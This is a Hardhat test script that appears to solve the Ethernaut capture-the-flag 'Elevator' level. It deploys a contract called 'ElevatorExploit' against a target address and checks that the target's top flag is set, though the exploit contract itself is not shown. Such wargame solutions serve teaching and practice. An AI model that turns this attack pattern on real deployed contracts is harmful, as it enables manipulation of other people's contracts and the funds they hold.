import { ethers } from "hardhat";
import { utils } from "ethers";
import { expect } from "chai";
import { traceDeprecation } from "process";

describe("Elevate", function(){
    it("Aims to Solve the Elevate Question of the Ethernaut CTF", async function(){

        this.timeout(0);

        // Initial Setup (Wallet etc..) 
        const accounts = await ethers.getSigners();
        const eoa = accounts[0];
        let balance = await eoa.getBalance();

        console.log(ethers.utils.formatEther(balance));
        expect(balance).to.gt(0); // Check if the wallet amount is greater than 0 (If you have any money)

        // Define Target ABI
        const targetABI = [
          "function goTo(uint _floor) external",
          "function floor() external returns(uint)",
          "function top() external returns(bool)",
        ]

        const targetAddr = "0x981035b044362cc52AA3976A0d1660A28C6330cd"; // Target Contract Address Here

        // Connect to the Target Contract
        let contract = new ethers.Contract(targetAddr, targetABI, ethers.getDefaultProvider());
        let targetCont = contract.connect(eoa);

        // Define and Connect to the Malicious Contract
        const maliciousFactory = await ethers.getContractFactory("ElevatorExploit");
        const maliciousContract = await maliciousFactory.deploy(targetAddr);

        // Wait for Malicious Contract to be Deployed
        await eoa.provider!.waitForTransaction(maliciousContract.deployTransaction.hash);

        let transaction = await maliciousContract.attack();
        await transaction.wait();
        console.log(transaction);

        //Final Check
        let topReached = await targetCont.top();
        console.log(topReached);
        expect(topReached).to.eq(true);
    });
});